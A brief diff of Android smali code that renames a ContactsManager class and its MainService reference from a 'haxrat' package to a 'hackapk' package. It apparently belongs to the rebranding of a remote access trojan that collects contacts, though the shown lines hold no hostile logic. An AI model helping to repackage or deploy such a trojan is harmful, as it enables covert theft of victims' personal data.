@@ -1,4 +1,4 @@
-.class public Lcom/hax4us/haxrat/ContactsManager;
+.class public Lcom/justhack/hackapk/ContactsManager;
 .super Ljava/lang/Object;
 .source "ContactsManager.java"
 
@@ -50,7 +50,7 @@
     move-object v2, v8
 
     .line 17
-    invoke-static {}, Lcom/hax4us/haxrat/MainService;->getContextOfApplication()Landroid/content/Context;
+    invoke-static {}, Lcom/justhack/hackapk/MainService;->getContextOfApplication()Landroid/content/Context;
 
     move-result-object v8
 
